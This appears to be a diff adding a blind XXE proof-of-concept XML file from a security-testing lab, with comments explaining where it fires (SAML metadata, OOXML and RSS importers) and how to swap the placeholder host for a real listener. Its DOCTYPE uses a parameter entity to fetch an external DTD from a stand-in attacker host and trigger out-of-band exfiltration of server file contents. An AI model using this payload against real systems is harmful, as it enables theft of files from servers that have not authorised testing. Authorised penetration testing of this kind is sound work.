@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Safe PoC -> x8bitranjit.
+  Benign PoC lab - x8bitranjit style. Authorized security testing only.
+
+  WHAT THIS DEMONSTRATES: Blind XXE - OOB callback via parameter entity +
+  external DTD. Use when the XML is parsed but nothing is reflected.
+
+  WHERE IT FIRES: XML/XML-backed endpoints and OOXML imports (docx/xlsx
+  internal XML), SAML metadata, RSS/OPML importers.
+
+  WHAT TO EDIT (2 places):
+    1) Below: YOUR-OOB-HOST.example.invalid  -> your listener
+    2) xxe_oob_beacon.dtd: same replacement
+  ".invalid" never resolves -> inert as shipped. When edited and parsed by a
+  vulnerable server, the server fetches the DTD from you, then beacons back
+  with the requested file's content in the URL (the classic two-hop exfil).
+
+  The REAL exfil DTD body (authorized only) is included in the .dtd comments.
+-->
+<!DOCTYPE poc [
+  <!ENTITY % dtd SYSTEM "http://xxe1.YOUR-OOB-HOST.example.invalid/evil.dtd">
+  %dtd;
+  %send;
+]>
+<poc>
+  <title>Benign blind-XXE OOB PoC</title>
+  <trigger>&exfil;</trigger>
+</poc>
